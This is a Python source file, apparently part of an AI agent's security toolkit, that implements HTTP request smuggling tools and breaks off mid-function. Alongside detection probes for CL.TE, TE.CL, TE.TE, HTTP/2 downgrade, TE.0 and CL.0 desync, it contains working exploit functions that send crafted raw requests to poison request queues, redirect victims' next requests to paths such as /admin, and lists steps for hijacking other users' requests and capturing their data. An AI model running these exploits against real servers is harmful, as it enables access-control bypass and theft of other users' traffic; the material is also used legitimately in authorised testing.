"""
HTTP Request Smuggling Scanner

Detects HTTP request smuggling vulnerabilities:
- CL.TE (Content-Length vs Transfer-Encoding)
- TE.CL (Transfer-Encoding vs Content-Length)
- TE.TE (Transfer-Encoding obfuscation)
- HTTP/2 downgrade smuggling
- Request queue poisoning
"""

from __future__ import annotations

import importlib
import logging
import secrets
import socket
import ssl
import time
import urllib.parse
from typing import Tuple

from src.sdk.tool import function_tool

logger = logging.getLogger(__name__)
_TIMEOUT = 10
_DEFAULT_UA = "Mozilla/5.0 (compatible; cyber-copilot-smuggling/1.0)"


def _send_raw_http(host: str, port: int, request: bytes, timeout: int = 10,
                   use_tls: bool = False) -> Tuple[bytes, float]:
    """Send raw HTTP request and return response with timing.
    
    Args:
        host: Target hostname or IP
        port: Target port
        request: Raw HTTP request bytes
        timeout: Socket timeout in seconds
        use_tls: Wrap connection with SSL/TLS (required for HTTPS targets)
    """
    try:
        import ssl
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        # Wrap with TLS for HTTPS targets
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        start = time.time()
        sock.connect((host, port))
        sock.sendall(request)
        
        response = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        elapsed = time.time() - start
        sock.close()
        
        return response, elapsed
    
    except Exception as e:
        logger.debug(f"Socket error: {e}")
        return b'', 0.0


@function_tool()
def http_smuggling_scanner(
    url: str,
    techniques: str = "all",
    timeout: int = 30,
    verify_with_timing: bool = True,
) -> str:
    """
    HTTP Request Smuggling vulnerability scanner.
    
    Tests for:
    1. CL.TE - Front-end uses Content-Length, back-end uses Transfer-Encoding
    2. TE.CL - Front-end uses Transfer-Encoding, back-end uses Content-Length
    3. TE.TE - Both use Transfer-Encoding but can be obfuscated
    4. HTTP/2 downgrade smuggling
    5. Request queue poisoning
    
    Args:
        url: Target URL (e.g. https://example.com)
        techniques: Comma-separated: clte,tecl,tete,h2cl,all
        timeout: Socket timeout in seconds
        verify_with_timing: Use timing-based verification
    
    Returns:
        HTTP request smuggling vulnerability assessment
    """
    output = ["═══════════════════════════════════════════════════════════",
              "      HTTP REQUEST SMUGGLING SCANNER",
              "═══════════════════════════════════════════════════════════", ""]
    
    findings = []
    
    # Parse URL
    import urllib.parse
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or "/"
    use_tls = parsed.scheme == 'https'
    
    if not host:
        return "Error: Invalid URL"
    
    output.append(f"Target: {host}:{port} ({'TLS' if use_tls else 'plaintext'})")
    output.append(f"Path: {path}")
    output.append("")
    
    tests = techniques.lower().split(',')
    if 'all' in tests:
        tests = ['clte', 'tecl', 'tete']
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 1: CL.TE (Content-Length vs Transfer-Encoding)
    # ══════════════════════════════════════════════════════════════════════
    if 'clte' in tests:
        output.append("── Test 1: CL.TE (Content-Length vs Transfer-Encoding) ─")
        output.append("  Front-end: Content-Length | Back-end: Transfer-Encoding")
        output.append("")
        
        # Technique: Send a request with both CL and TE headers
        # If vulnerable, the back-end will process the chunked body
        
        # Test 1a: Basic CL.TE probe
        clte_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        ).encode()
        
        output.append("  Probe 1a: Basic CL.TE")
        try:
            resp, elapsed = _send_raw_http(host, port, clte_request, timeout, use_tls=use_tls)
            
            if resp:
                status_line = resp.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                output.append(f"    Response: {status_line} ({elapsed:.2f}s)")
                
                # Check for timeout or delayed response (indicates smuggling)
                if elapsed > 5:
                    findings.append("HIGH → CL.TE smuggling detected (timing-based)")
                    output.append("    ⚠ VULNERABLE: Delayed response indicates smuggling")
            else:
                output.append("    ✗ No response (timeout)")
        except Exception as e:
            output.append(f"    ✗ Error: {e}")
        
        # Test 1b: CL.TE with smuggled request
        clte_smuggle = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        
        output.append("\n  Probe 1b: CL.TE with smuggled request")
        try:
            resp, elapsed = _send_raw_http(host, port, clte_smuggle, timeout, use_tls=use_tls)
            
            if resp:
                status_line = resp.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                output.append(f"    Response: {status_line} ({elapsed:.2f}s)")
                
                # Send a follow-up request to see if it's affected
                followup = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                ).encode()
                
                time.sleep(0.5)
                resp2, elapsed2 = _send_raw_http(host, port, followup, timeout, use_tls=use_tls)
                
                if resp2:
                    status_line2 = resp2.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                    output.append(f"    Follow-up: {status_line2} ({elapsed2:.2f}s)")
                    
                    # Check if follow-up got a weird response (404, 405, etc.)
                    if b'404' in resp2 or b'405' in resp2 or b'400' in resp2:
                        findings.append("CRITICAL → CL.TE smuggling CONFIRMED (follow-up poisoned)")
                        output.append("    ✓ CONFIRMED: Follow-up request was poisoned")
        except Exception as e:
            output.append(f"    ✗ Error: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 2: TE.CL (Transfer-Encoding vs Content-Length)
    # ══════════════════════════════════════════════════════════════════════
    if 'tecl' in tests:
        output.append("── Test 2: TE.CL (Transfer-Encoding vs Content-Length) ─")
        output.append("  Front-end: Transfer-Encoding | Back-end: Content-Length")
        output.append("")
        
        # Test 2a: Basic TE.CL probe
        tecl_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        
        output.append("  Probe 2a: Basic TE.CL")
        try:
            resp, elapsed = _send_raw_http(host, port, tecl_request, timeout, use_tls=use_tls)
            
            if resp:
                status_line = resp.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                output.append(f"    Response: {status_line} ({elapsed:.2f}s)")
                
                if elapsed > 5:
                    findings.append("HIGH → TE.CL smuggling detected (timing-based)")
                    output.append("    ⚠ VULNERABLE: Delayed response indicates smuggling")
            else:
                output.append("    ✗ No response (timeout)")
        except Exception as e:
            output.append(f"    ✗ Error: {e}")
        
        # Test 2b: TE.CL with differential response
        tecl_differential = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        ).encode()
        
        output.append("\n  Probe 2b: TE.CL differential")
        try:
            resp, elapsed = _send_raw_http(host, port, tecl_differential, timeout, use_tls=use_tls)
            
            if resp:
                status_line = resp.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                output.append(f"    Response: {status_line} ({elapsed:.2f}s)")
                
                # Send follow-up
                followup = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                ).encode()
                
                time.sleep(0.5)
                resp2, elapsed2 = _send_raw_http(host, port, followup, timeout, use_tls=use_tls)
                
                if resp2:
                    status_line2 = resp2.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                    output.append(f"    Follow-up: {status_line2} ({elapsed2:.2f}s)")
                    
                    if b'400' in resp2 or b'404' in resp2:
                        findings.append("CRITICAL → TE.CL smuggling CONFIRMED")
                        output.append("    ✓ CONFIRMED: Follow-up request was poisoned")
        except Exception as e:
            output.append(f"    ✗ Error: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 3: TE.TE (Transfer-Encoding obfuscation)
    # ══════════════════════════════════════════════════════════════════════
    if 'tete' in tests:
        output.append("── Test 3: TE.TE (Transfer-Encoding obfuscation) ──────")
        output.append("  Both use Transfer-Encoding but one can be obfuscated")
        output.append("")
        
        # Various TE header obfuscations
        te_obfuscations = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked ",
            "Transfer-Encoding: x-chunked",
            " Transfer-Encoding: chunked",
            "Transfer-Encoding\r\n : chunked",
            "Transfer-encoding: chunked",
            "Transfer-Encoding: identity",
            "Transfer-Encoding: chunked, identity",
        ]
        
        for i, te_header in enumerate(te_obfuscations[:5], 1):
            tete_request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"{te_header}\r\n"
                f"Content-Length: 4\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 15\r\n"
                f"\r\n"
                f"x=1\r\n"
                f"0\r\n"
                f"\r\n"
            ).encode()
            
            output.append(f"  Probe 3.{i}: {te_header[:40]}")
            try:
                resp, elapsed = _send_raw_http(host, port, tete_request, timeout, use_tls=use_tls)
                
                if resp:
                    status_line = resp.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                    output.append(f"    Response: {status_line} ({elapsed:.2f}s)")
                    
                    if elapsed > 5:
                        findings.append(f"HIGH → TE.TE smuggling with obfuscation: {te_header}")
                        output.append("    ⚠ VULNERABLE: Obfuscation accepted")
            except Exception as e:
                output.append(f"    ✗ Error: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Summary
    # ══════════════════════════════════════════════════════════════════════
    # ══════════════════════════════════════════════════════════════════════
    # Test 4: HTTP/2 Downgrade Smuggling (H2.TE / H2.CL)
    # ══════════════════════════════════════════════════════════════════════
    if 'h2' in tests or 'all' in tests:
        output.append("── Test 4: HTTP/2 Downgrade Smuggling (H2.TE / H2.CL) ──")
        import subprocess
        # Check if target supports HTTP/2 via ALPN
        check_cmd = ["curl", "-s", "-I", "--http2", f"https://{host}:{port}{path}"]
        try:
            h2_check = subprocess.run(check_cmd, capture_output=True, text=True, timeout=10)
            if "HTTP/2" in h2_check.stdout:
                output.append("  [INFO] Target supports HTTP/2. Testing for downgrade injection...")
                
                # Payload 1: H2.TE via header injection (curl may sanitize but worth testing)
                # We inject \r\n into a header value, hoping the H2->H1 downgrade turns it into a valid H1 header
                h2_cmd = ["curl", "-s", "-i", "--http2", "-X", "POST",
                         "-H", "Transfer-Encoding: chunked\\r\\nEvil-Injection: true", 
                         "-d", "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
                         f"https://{host}:{port}{path}"]
                         
                start = time.time()
                h2_res = subprocess.run(h2_cmd, capture_output=True, text=True, timeout=10)
                h2_elapsed = time.time() - start
                
                if h2_elapsed > 5:
                    findings.append("HIGH → HTTP/2 Downgrade Smuggling (H2.TE timing-based)")
                    output.append(f"    ⚠ VULNERABLE: Delayed response ({h2_elapsed:.2f}s) indicates H2.TE smuggling")
                elif "400" in h2_res.stdout or "405" in h2_res.stdout:
                    output.append(f"    ⚠ SUSPICIOUS: Received {h2_res.stdout.split()[1] if len(h2_res.stdout.split()) > 1 else 'error'} on H2 downgrade injection")
                else:
                    output.append("    ✗ No anomalies detected during H2 downgrade test")
            else:
                output.append("  [INFO] Target does not appear to support HTTP/2")
        except Exception as e:
            output.append(f"    ✗ HTTP/2 check error: {e}")
        
        output.append("")

    output.append("═══════════════════════════════════════════════════════════")
    output.append("                      SUMMARY")
    output.append("═══════════════════════════════════════════════════════════")
    
    if findings:
        output.append(f"\n🔴 Found {len(findings)} HTTP smuggling vulnerabilities:\n")
        for finding in findings:
            output.append(f"  • {finding}")
        
        output.append("\n📋 Exploitation:")
        output.append("  1. Use Burp Suite Turbo Intruder for automated exploitation")
        output.append("  2. Smuggle requests to bypass WAF/authentication")
        output.append("  3. Poison request queue to hijack other users' requests")
        output.append("  4. Capture sensitive data from other users")
        output.append("  5. Perform cache poisoning attacks")
        
        output.append("\n📋 Remediation:")
        output.append("  1. Disable HTTP/1.1 keep-alive connections")
        output.append("  2. Use HTTP/2 exclusively (no downgrade)")
        output.append("  3. Normalize ambiguous requests at front-end")
        output.append("  4. Reject requests with both CL and TE headers")
        output.append("  5. Use same HTTP parsing library on all layers")
    else:
        output.append("\n✅ No obvious HTTP smuggling vulnerabilities detected.")
        output.append("   Note: This is a complex vulnerability requiring manual verification.")
        output.append("   Consider using Burp Suite's HTTP Request Smuggler extension.")
    
    return "\n".join(output)


@function_tool()
def http_smuggling_exploit(
    url: str,
    technique: str,
    smuggled_request: str,
    num_requests: int = 2,
) -> str:
    """
    Exploit confirmed HTTP request smuggling vulnerability.
    
    Args:
        url: Target URL
        technique: clte, tecl, or tete
        smuggled_request: The request to smuggle (raw HTTP format)
        num_requests: Number of requests to send (for queue poisoning)
    
    Returns:
        Exploitation results
    """
    import urllib.parse
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or "/"
    use_tls = parsed.scheme == 'https'
    
    output = [f"Exploiting {technique.upper()} smuggling on {host}:{port} ({'TLS' if use_tls else 'plaintext'})", ""]
    
    if technique.lower() == 'clte':
        # CL.TE exploitation
        exploit_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{len(smuggled_request):x}\r\n"
            f"{smuggled_request}\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
    
    elif technique.lower() == 'tecl':
        # TE.CL exploitation
        exploit_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"{smuggled_request}"
        ).encode()
    
    else:
        return f"Error: Unknown technique '{technique}'. Use: clte, tecl, or tete"
    
    # Send exploit requests
    for i in range(num_requests):
        try:
            resp, elapsed = _send_raw_http(host, port, exploit_request, 30, use_tls=use_tls)
            
            if resp:
                status_line = resp.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                output.append(f"Request {i+1}: {status_line} ({elapsed:.2f}s)")
            else:
                output.append(f"Request {i+1}: No response")
        
        except Exception as e:
            output.append(f"Request {i+1}: Error - {e}")
        
        time.sleep(0.5)
    
    output.append("\nℹ Send a normal request now to see if it was poisoned by the smuggled request.")
    
    return "\n".join(output)

# ─────────────────────────────────────────────────────────────────────────────
# Additional probes from request_smuggling_probe family (smuggling.py)
# ─────────────────────────────────────────────────────────────────────────────

def _parse_url(url: str):
    p = urllib.parse.urlparse(url)
    host = p.hostname
    port = p.port or (443 if p.scheme == "https" else 80)
    use_tls = p.scheme == "https"
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    return host, port, use_tls, path


def _raw_send(host: str, port: int, use_tls: bool, raw_request: bytes) -> Tuple[int, str]:
    """Send a raw TCP/TLS request and return (status_code, response_body)."""
    try:
        sock = socket.create_connection((host, port), timeout=_TIMEOUT)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(raw_request)
        response = b""
        sock.settimeout(10)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        sock.close()
        decoded = response.decode("utf-8", errors="replace")
        # Extract status code
        first_line = decoded.split("\r\n")[0] if "\r\n" in decoded else decoded[:50]
        status = 0
        parts = first_line.split()
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass
        return status, decoded
    except Exception as e:
        return 0, f"Connection error: {e}"


@function_tool()
def request_smuggling_probe(
    url: str,
    technique: str = "all",
    timeout_secs: int = 15,
) -> str:
    """
    Probe a target for HTTP Request Smuggling (Desync) vulnerabilities.

    Tests:
      - CL.TE  : Content-Length front-end, Transfer-Encoding back-end
      - TE.CL  : Transfer-Encoding front-end, Content-Length back-end
      - TE.TE  : Both servers support TE, but one can be obfuscated
      - H2.CL  : HTTP/2 downgrade with Content-Length discrepancy
      - H2.TE  : HTTP/2 downgrade with Transfer-Encoding smuggle

    Detection methods:
      - Timing: CL.TE sends incomplete chunked body → back-end waits → timeout
      - Differential: Two requests sent; second request returns poisoned response

    Args:
        url: Target URL (e.g. https://target.com/search)
        technique: Which technique to test — all | CL.TE | TE.CL | TE.TE | H2.CL
        timeout_secs: Seconds to wait for timing-based detection (default: 15)

    Returns:
        Smuggling probe results with confirmed techniques and PoC
    """
    host, port, use_tls, path = _parse_url(url)
    out = [f"=== HTTP Request Smuggling Probe: {url}", f"  Technique: {technique}", ""]
    findings = []

    tech_upper = technique.upper()
    run_all = tech_upper == "ALL"

    # ── CL.TE Timing Attack ───────────────────────────────────────────────────
    if run_all or tech_upper == "CL.TE":
        out.append("── CL.TE (Content-Length / Transfer-Encoding) ──")
        # Send a request with CL=6 but an incomplete chunked body
        # If TE back-end, it waits for the chunk terminator → timed response
        cl_te_req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {_DEFAULT_UA}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"  # the extra byte that CL=6 acknowledges but TE ignores
        ).encode()

        t0 = time.time()
        status, resp = _raw_send(host, port, use_tls, cl_te_req)
        elapsed = time.time() - t0
        out.append(f"  [CL.TE timing] HTTP {status}  elapsed={elapsed:.1f}s")

        if elapsed >= (timeout_secs * 0.7) or status == 0:
            findings.append(
                f"HIGH → CL.TE Smuggling candidate — request took {elapsed:.1f}s "
                "(back-end waited for chunk terminator). Confirm with differential attack."
            )
            out.append("  [CL.TE] TIMING HIT — possible CL.TE smuggling")
        else:
            out.append("  [CL.TE] No significant delay — not vulnerable or patched")

    # ── TE.CL Timing Attack ───────────────────────────────────────────────────
    if run_all or tech_upper == "TE.CL":
        out.append("")
        out.append("── TE.CL (Transfer-Encoding / Content-Length) ──")
        # Front-end uses TE, back-end uses CL. Send chunked with extra data
        te_cl_req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {_DEFAULT_UA}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q"  # TE says 1 byte, but CL=3 expects 3 bytes → back-end waits
        ).encode()

        t0 = time.time()
        status, resp = _raw_send(host, port, use_tls, te_cl_req)
        elapsed = time.time() - t0
        out.append(f"  [TE.CL timing] HTTP {status}  elapsed={elapsed:.1f}s")

        if elapsed >= (timeout_secs * 0.7) or status == 0:
            findings.append(
                f"HIGH → TE.CL Smuggling candidate — request took {elapsed:.1f}s "
                "(back-end waited for extra body bytes from CL header)."
            )
            out.append("  [TE.CL] TIMING HIT — possible TE.CL smuggling")
        else:
            out.append("  [TE.CL] No significant delay")

    # ── TE.TE Obfuscation ─────────────────────────────────────────────────────
    if run_all or tech_upper == "TE.TE":
        out.append("")
        out.append("── TE.TE (Transfer-Encoding Obfuscation) ───────")
        obfuscations = [
            ("chunked-space",   "Transfer-Encoding: chunked\r\nTransfer-Encoding:  chunked"),
            ("chunked-tab",     "Transfer-Encoding: chunked\r\nTransfer-Encoding:\tchunked"),
            ("chunked-null",    "Transfer-Encoding: chunked\r\nX: X\nTransfer-Encoding: chunked"),
            ("chunKed-case",    "Transfer-Encoding: chUnKed"),
        ]
        for obf_name, te_header in obfuscations:
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {_DEFAULT_UA}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{te_header}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
            ).encode()

            t0 = time.time()
            status, resp = _raw_send(host, port, use_tls, req)
            elapsed = time.time() - t0
            out.append(f"  [TE.TE:{obf_name}] HTTP {status}  elapsed={elapsed:.1f}s")

            if elapsed >= (timeout_secs * 0.7):
                findings.append(
                    f"HIGH → TE.TE Smuggling via obfuscation '{obf_name}' — "
                    f"{elapsed:.1f}s delay indicates one server ignores the obfuscated TE header."
                )
                out.append(f"  [TE.TE] TIMING HIT with {obf_name}")
                break

    # ── H2.CL (via requests — HTTP/2 downgrade) ───────────────────────────────
    if run_all or tech_upper == "H2.CL":
        out.append("")
        out.append("── H2.CL (HTTP/2 with Content-Length discrepancy) ─")
        try:
            httpx = importlib.import_module("httpx")
            httpx_client = getattr(httpx, "Client")
            with httpx_client(http2=True, verify=False, timeout=10) as client:
                resp = client.post(
                    url,
                    content=b"smuggled-body",
                    headers={
                        "content-type": "application/x-www-form-urlencoded",
                        "content-length": "0",  # Lie about content-length
                        "user-agent": _DEFAULT_UA,
                    }
                )
                if resp.status_code not in (400, 405, 403):
                    out.append(f"  [H2.CL] HTTP {resp.status_code} — server accepted H2 with CL:0 mismatch")
                    findings.append(
                        f"MEDIUM → H2.CL candidate — server accepted HTTP/2 request with "
                        f"content-length:0 but non-empty body (HTTP {resp.status_code}). "
                        "Manual confirmation required with Burp HTTP/2 smuggler."
                    )
                else:
                    out.append(f"  [H2.CL] HTTP {resp.status_code} — rejected")
        except ImportError:
            out.append("  [H2.CL] httpx not installed — install with: pip install httpx[http2]")
        except Exception as e:
            out.append(f"  [H2.CL] Error: {e}")

    # ── Differential detection (CL.TE confirm) ───────────────────────────────
    if findings and (run_all or tech_upper == "CL.TE"):
        out.append("")
        out.append("── Differential Confirmation (CL.TE) ───────────")
        # Poison request: smuggles a partial GET to poison next victim's request
        poison = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 54\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"GET /smug-confirm HTTP/1.1\r\n"
            f"Foo: bar"
        ).encode()
        _raw_send(host, port, use_tls, poison)
        time.sleep(0.1)
        # Follow-up request — should get 404 if poisoned
        requests_get = getattr(importlib.import_module("requests"), "get")
        followup = requests_get(url, headers={"User-Agent": _DEFAULT_UA},
                                verify=False, timeout=10)
        if followup.status_code == 404 and "smug-confirm" in (followup.text or ""):
            findings.append(
                "CRITICAL → CL.TE Smuggling CONFIRMED via differential — "
                "follow-up request received poisoned 404 for /smug-confirm."
            )
            out.append("  [differential] CONFIRMED — poisoned response received")
        else:
            out.append(f"  [differential] HTTP {followup.status_code} — not conclusive")

    # ── Summary ───────────────────────────────────────────────────────────────
    out.append("")
    if findings:
        out.append("── FINDINGS ──────────────────────────────────")
        out.extend(findings)
        out.append("")
        out.append("Next Steps:")
        out.append("  1. Confirm with Burp Suite HTTP Request Smuggler extension")
        out.append("  2. Use differential attack to prove request poisoning")
        out.append("  3. Escalate: bypass access controls, steal requests, XSS via smuggled responses")
        out.append("  Tool: https://github.com/PortSwigger/http-request-smuggler")
    else:
        out.append("No HTTP Request Smuggling detected.")
        out.append("Note: False negatives are common — confirm with Burp Smuggler extension.")

    return "\n".join(out)


@function_tool()
def smuggling_poison_request(
    url: str,
    victim_path: str = "/admin",
    technique: str = "CL.TE",
) -> str:
    """
    Craft and send a request-smuggling poison payload to redirect a victim's
    subsequent request to an attacker-controlled path.

    CAUTION: Only use on targets you own or have written permission to test.

    Args:
        url: Vulnerable endpoint (POST endpoint that accepts a body)
        victim_path: Path to smuggle into victim's next request (e.g. /admin)
        technique: CL.TE or TE.CL

    Returns:
        Poison request details and expected victim response
    """
    host, port, use_tls, path = _parse_url(url)
    out = [f"=== Smuggling Poison: {url}", f"  Victim path: {victim_path}", ""]

    smuggled_header = (
        f"GET {victim_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"X-Ignore: X"
    )

    if technique.upper() == "CL.TE":
        body_chunk = smuggled_header.encode()
        chunk_size = len(body_chunk)
        full_body = f"{chunk_size:x}\r\n{smuggled_header}\r\n0\r\n\r\n"
        cl = len(full_body.encode())
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {cl}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{full_body}"
        ).encode()
    else:  # TE.CL
        smuggled_cl = len(smuggled_header.encode())
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {smuggled_cl}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"{smuggled_header}"
        ).encode()

    status, resp = _raw_send(host, port, use_tls, req)
    out.append(f"Poison sent — HTTP {status}")
    out.append(f"\nRaw request preview (first 400 bytes):\n{req[:400].decode('utf-8', errors='replace')}")
    out.append(f"\nResponse preview:\n{resp[:300]}")
    out.append("\nNow send a normal GET request to the target — if it returns the")
    out.append(f"response for {victim_path}, the smuggle was successful.")
    return "\n".join(out)

# ─────────────────────────────────────────────────────────────────────────────
# Modern smuggling primitives: TE.0 / CL.0 / H2→H1 downgrade (smuggling_v2.py)
# ─────────────────────────────────────────────────────────────────────────────

def _send_raw(host: str, port: int, payload: bytes, timeout: int = 10, use_tls: bool = False) -> bytes:
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(payload)
        buf = b""
        sock.settimeout(timeout)
        while True:
            try:
                chunk = sock.recv(65535)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
            if len(buf) > 200_000:
                break
        sock.close()
        return buf
    except Exception as e:
        logger.debug(f"raw send failed: {e}")
        return b""

@function_tool()
def smuggling_te0(url: str, smuggled_path: str = "/admin", timeout: int = 12) -> str:
    """
    TE.0 smuggling probe.

    Front-end honors Transfer-Encoding (chunked), back-end ignores it and uses
    Content-Length: 0. We smuggle a second request inside the chunked body —
    if the back-end serves the smuggled path on the next user's connection,
    we've polluted the queue.

    Args:
        url:           Target URL (front-end)
        smuggled_path: Path the smuggled request will fetch (default /admin)
    """
    host, port, use_tls, path = _parse_url(url)
    canary = secrets.token_hex(6).upper()

    smuggled = (
        f"GET {smuggled_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"X-Smuggle-Canary: {canary}\r\n"
        f"Content-Length: 0\r\n\r\n"
    ).encode()

    chunk_hex = f"{len(smuggled):x}".encode()

    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + chunk_hex + b"\r\n" + smuggled + b"0\r\n\r\n"

    t0 = time.time()
    resp1 = _send_raw(host, port, payload, timeout=timeout, use_tls=use_tls)
    spent = time.time() - t0

    # Probe a follow-up request on a fresh connection — if the front/back-end shared
    # the same back-end keep-alive socket, the canary path may be returned.
    follow = (f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
    resp2 = _send_raw(host, port, follow, timeout=timeout, use_tls=use_tls)

    out = [f"## TE.0 probe: {url}", f"Smuggled path: {smuggled_path}", f"Canary: {canary}"]
    out.append(f"\n[1] Initial response ({spent*1000:.0f} ms): {resp1[:200]!r}")
    out.append(f"\n[2] Follow-up: {resp2[:200]!r}")

    indicators = []
    if canary.encode() in resp2 or smuggled_path.encode() in resp2:
        indicators.append("Canary echoed in follow-up — smuggling SUCCEEDED")
    if b"400 Bad" in resp1[:300] or b"408 Request Timeout" in resp1[:300]:
        indicators.append("Front-end 400/408 with TE+CL — desync candidate (try CL.0/TE.0 variants)")
    if not indicators:
        indicators.append("No clear pollution detected.")
    out.append("\n[Verdict] " + " | ".join(indicators))
    return "\n".join(out)


@function_tool()
def smuggling_cl0(url: str, smuggled_path: str = "/admin", timeout: int = 12) -> str:
    """
    CL.0 smuggling probe.

    Send Content-Length: 0 with an actual body. Front-end forwards 0 bytes,
    back-end reads the body as the start of the next request — same canary
    mechanic.

    Args:
        url:           Target URL (front-end)
        smuggled_path: Smuggled request path
    """
    host, port, use_tls, path = _parse_url(url)
    canary = secrets.token_hex(6).upper()

    smuggled_req = (
        f"GET {smuggled_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
